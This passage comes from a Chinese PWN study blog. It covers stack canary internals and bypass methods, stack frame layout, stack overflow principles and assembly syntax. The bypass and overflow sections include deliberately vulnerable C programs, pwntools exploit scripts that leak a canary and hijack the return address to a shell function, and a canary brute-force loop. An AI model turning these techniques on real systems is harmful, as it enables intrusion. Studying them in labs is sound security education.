tcbhead_t;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">// ex2.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void getshell(void) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void init() &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line">&#125;</span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">        read(0, buf, 0x200);</span><br><span class="line">        printf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    init();</span><br><span class="line">    puts(&quot;Hello Hacker!&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">$ gcc -m32 -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &#x27;ex2&#x27;</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./ex2&#x27;)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line"></span><br><span class="line"># leak Canary</span><br><span class="line">payload = &quot;A&quot;*100</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;A&quot;*100)</span><br><span class="line">Canary = u32(io.recv(4))-0xa</span><br><span class="line">log.info(&quot;Canary:&quot;+hex(Canary))</span><br><span class="line"></span><br><span class="line"># Bypass Canary</span><br><span class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">print &quot;[+] Brute forcing stack canary &quot;</span><br><span class="line"></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p)+8</span><br><span class="line"></span><br><span class="line">while len(p) &lt; stop:</span><br><span class="line">   for i in xrange(0,256):</span><br><span class="line">      res = send2server(p + chr(i))</span><br><span class="line"></span><br><span class="line">      if res != &quot;&quot;:</span><br><span class="line">         p = p + chr(i)</span><br><span class="line">         #print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br><span class="line">         break</span><br><span class="line"></span><br><span class="line">      if i == 255:</span><br><span class="line">         print &quot;[-] Exploit failed&quot;</span><br><span class="line">         sys.exit(-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-1:-1].encode(&quot;hex&quot;)</span><br><span class="line">print &quot;   [+] SSP value is 0x%s&quot; % canary</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参见 StarCTF2018 babystack</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-Linux安全机制 </category>
          
          <category> 2-Stack Canaries </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1-栈介绍</title>
      <link href="/2025/07/fa6880b0859f.html"/>
      <url>/2025/07/fa6880b0859f.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h1><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><p><img src="/../../../../../../images/image-20250701104727634.png" alt="image-20250701104727634"></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong><code>程序的栈是从进程地址空间的高地址向低地址增长的</code></strong>。</p><h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><h3 id="栈指针-SP"><a href="#栈指针-SP" class="headerlink" title="栈指针 (SP)"></a>栈指针 (SP)</h3><ul><li>x86: ESP (32位), x64: RSP (64位)</li><li>始终指向栈顶位置</li><li><code>push/pop</code> 指令自动修改 SP</li></ul><h3 id="基址指针-BP"><a href="#基址指针-BP" class="headerlink" title="基址指针 (BP)"></a>基址指针 (BP)</h3><ul><li>x86: EBP, x64: RBP</li><li>作为当前栈帧的基准点</li><li>用于定位参数和局部变量</li></ul><h3 id="指令指针-IP"><a href="#指令指针-IP" class="headerlink" title="指令指针 (IP)"></a>指令指针 (IP)</h3><ul><li>x86: EIP, x64: RIP</li><li>存储下一条执行指令地址</li><li><code>call/ret</code> 指令修改 IP</li></ul><h2 id="函数调用过程（关键！）"><a href="#函数调用过程（关键！）" class="headerlink" title="函数调用过程（关键！）"></a>函数调用过程（关键！）</h2><h3 id="调用者-Caller-准备"><a href="#调用者-Caller-准备" class="headerlink" title="调用者 (Caller) 准备"></a>调用者 (Caller) 准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 参数压栈（从右向左）</span><br><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">; 2. 调用函数</span><br><span class="line">call function  ; 自动压入返回地址(EIP/RIP)</span><br></pre></td></tr></table></figure><h3 id="被调函数-Callee-序言"><a href="#被调函数-Callee-序言" class="headerlink" title="被调函数 (Callee) 序言"></a>被调函数 (Callee) 序言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function:</span><br><span class="line">; 1. 保存调用者栈帧</span><br><span class="line">push ebp        ; 保存旧EBP</span><br><span class="line">; 2. 建立新栈帧</span><br><span class="line">mov ebp, esp    ; EBP = 当前ESP</span><br><span class="line">; 3. 分配局部变量空间</span><br><span class="line">sub esp, 0x20   ; 分配32字节空间</span><br></pre></td></tr></table></figure><h3 id="栈帧内存布局（32位示例）"><a href="#栈帧内存布局（32位示例）" class="headerlink" title="栈帧内存布局（32位示例）"></a>栈帧内存布局（32位示例）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数3        | [ebp + 16]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数2        | [ebp + 12]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数1        | [ebp + 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|    返回地址      | [ebp + 4]  ← 漏洞利用关键点！</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的EBP       | &lt;-- EBP (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量1     | [ebp - 4]</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量2     | [ebp - 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|     ...         | </span><br><span class="line">+-----------------+</span><br><span class="line">|    临时空间      | &lt;-- ESP (栈顶)</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><h3 id="函数返回过程"><a href="#函数返回过程" class="headerlink" title="函数返回过程"></a>函数返回过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 返回值存入EAX（约定）</span><br><span class="line">mov eax, return_value</span><br><span class="line">; 2. 释放局部空间</span><br><span class="line">mov esp, ebp    ; ESP = EBP</span><br><span class="line">; 3. 恢复调用者栈帧</span><br><span class="line">pop ebp         ; 恢复旧EBP</span><br><span class="line">; 4. 返回到调用者</span><br><span class="line">ret             ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><h1 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h1><p>寄存器的图</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/figure/register.png" alt="img"></p><p><code>需要注意的是，32 位和 64 位程序有以下简单的区别:</code></p><ul><li><p><code>x86</code></p><ul><li><p><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</p></li><li><p><strong>栈帧布局</strong>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">| 参数N     | ← EBP + 4*(N+1)</span><br><span class="line">| ...      |</span><br><span class="line">| 参数2     | ← EBP + 12</span><br><span class="line">| 参数1     | ← EBP + 8</span><br><span class="line">| 返回地址   | ← EBP + 4</span><br><span class="line">| 保存的EBP  | ← EBP</span><br><span class="line">| 局部变量   | ← EBP - 4</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>x64</code></p><ul><li><p>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p></li><li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p></li><li><p><strong>栈帧布局</strong>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">| 额外参数N  | ← RBP + 8*(N+1)</span><br><span class="line">| ...       |</span><br><span class="line">| 额外参数1  | ← RBP + 16</span><br><span class="line">| 返回地址    | ← RBP + 8</span><br><span class="line">| 保存的RBP  | ← RBP</span><br><span class="line">| 局部变量    | ← RBP - 8</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2-栈溢出原理</title>
      <link href="/2025/07/e846fd6fd950.html"/>
      <url>/2025/07/e846fd6fd950.html</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p><p>我们利用如下命令对其进行编译</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  gcc -m32 -fno-stack-protector stack_example.c -o stack_example -no-pie</span><br><span class="line">stack-example.c: In <span class="keyword">function</span> <span class="string">&#x27;vulnerable&#x27;</span>:</span><br><span class="line">stack-example.c:8:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;gets&#x27;</span>; did you mean <span class="string">&#x27;fgets&#x27;</span>? [-Wimplicit-function-declaration]</span><br><span class="line">    8 |     gets(s);</span><br><span class="line">      |     ^~~~</span><br><span class="line">      |     fgets</span><br><span class="line">/usr/bin/ld: /tmp/ccevu0Fc.o: <span class="keyword">in</span> <span class="keyword">function</span> `vulnerable<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">stack-example.c:(.text+0x45): warning: the `gets&#x27;</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p><blockquote><p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p></blockquote><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p><p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec stack_example</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p><ul><li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li><li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li></ul><p>我们可以使用 <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> 关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p><p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x08049176。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08049176 success         proc near</span><br><span class="line">.text:08049176</span><br><span class="line">.text:08049176 var_4           = dword ptr -4</span><br><span class="line">.text:08049176</span><br><span class="line">.text:08049176 ; __unwind &#123;</span><br><span class="line">.text:08049176                 push    ebp</span><br><span class="line">.text:08049177                 mov     ebp, esp</span><br><span class="line">.text:08049179                 push    ebx</span><br><span class="line">.text:0804917A                 sub     esp, 4</span><br><span class="line">.text:0804917D                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08049182                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:08049187                 sub     esp, 0Ch</span><br><span class="line">.text:0804918A                 lea     edx, (aYouHavaAlready - 804BFF4h)[eax] ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08049190                 push    edx             ; s</span><br><span class="line">.text:08049191                 mov     ebx, eax</span><br><span class="line">.text:08049193                 call    _puts</span><br><span class="line">.text:08049198                 add     esp, 10h</span><br><span class="line">.text:0804919B                 nop</span><br><span class="line">.text:0804919C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:0804919F                 leave</span><br><span class="line">.text:080491A0                 retn</span><br><span class="line">.text:080491A0 ; &#125; // starts at 8049176</span><br><span class="line">.text:080491A0 success         endp</span><br></pre></td></tr></table></figure><p>那么如果我们读取的字符串为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x14*&#x27;a&#x27;+&#x27;bbbb&#x27;+success_addr</span><br></pre></td></tr></table></figure><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x08049176   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08049176在内存中的形式是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x76\x91\x04\x08</span><br></pre></td></tr></table></figure><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x76 作为一个字符输入进去。这里利用 pwntools 的代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x08049176</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p32(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行一波代码，可以得到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./stack_example&#x27;</span>: pid 70</span><br><span class="line">b<span class="string">&#x27;\x86\x91\x04\x08&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb\x86\x91\x04\x08</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 61936)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>可以看到我们确实已经执行 success 函数。</p><h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p><h2 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h2><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h2 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h2><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>装载与汇编</title>
      <link href="/2025/06/80115e1b9881.html"/>
      <url>/2025/06/80115e1b9881.html</url>
      
        <content type="html"><![CDATA[<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><p><img src="/../../../../../images/image-20250630141153683.png" alt="image-20250630141153683"></p><p><img src="/../../../../../images/image-20250630140857482.png" alt="image-20250630140857482"></p><p><img src="/../../../../../images/image-20250630141427878.png" alt="image-20250630141427878"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="两种语法风格"><a href="#两种语法风格" class="headerlink" title="两种语法风格"></a>两种语法风格</h2><table><thead><tr><th>功能 &#x2F; 场景</th><th>Intel 汇编格式</th><th>AT&amp;T 汇编格式</th></tr></thead><tbody><tr><td><strong>立即数传送到寄存器</strong></td><td><code>mov eax, 8</code></td><td><code>movl $8, %eax</code></td></tr><tr><td><strong>带十六进制立即数的传送</strong></td><td><code>mov ebx, 0ffffh</code></td><td><code>movl $0xffff, %ebx</code></td></tr><tr><td><strong>触发系统调用（中断）</strong></td><td><code>int 80h</code></td><td><code>int $0x80</code></td></tr><tr><td><strong>内存数据传送到寄存器</strong></td><td><code>mov eax, [ecx]</code></td><td><code>movl (%ecx), %eax</code></td></tr><tr><td><strong>函数 &#x2F; 过程（sum 示例）</strong></td><td>sum:<br/>push ebp<br/>mov ebp, esp<br/>mov eax, [ebp+12]<br/>add eax, [ebp+8]<br/>pop ebp<br/>retn<br/></td><td>sum:<br/>pushl %ebp<br/>movl %esp, %ebp<br/>movl 12(%ebp), %eax<br/>addl 8(%ebp), %eax<br/>popl %ebp<br/>ret<br/></td></tr></tbody></table><h2 id="寄存器与数据类型"><a href="#寄存器与数据类型" class="headerlink" title="寄存器与数据类型"></a>寄存器与数据类型</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table><thead><tr><th align="left"><strong>寄存器</strong></th><th align="left"><strong>位数</strong></th><th align="left"><strong>主要功能</strong></th><th align="left"><strong>特殊用途</strong></th><th 